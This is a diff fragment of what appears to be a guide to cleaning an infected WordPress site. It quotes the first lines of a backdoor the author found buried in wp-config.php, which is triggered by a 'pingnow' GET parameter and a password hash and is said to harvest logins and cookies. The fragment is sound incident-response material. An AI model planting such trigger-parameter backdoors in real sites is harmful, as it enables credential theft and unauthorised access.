@@ -30,7 +30,7 @@ wp-includes/js/l10n.js
 
 3. Open "`wp-config.php`" and look for anything that seems out of place. In mine, I found a script which appears to harvest login credentials/cookies, which found on the 2000 or so line. Above and a few thousand lines below were all blank:
 
-```
+```php
 if (isset($_GET['pingnow'])&& isset($_GET['pass'])){
 if ($_GET['pass'] == '19ca14e7ea6328a42e0eb13d585e4c22'){
 if ($_GET['pingnow']== 'login'){
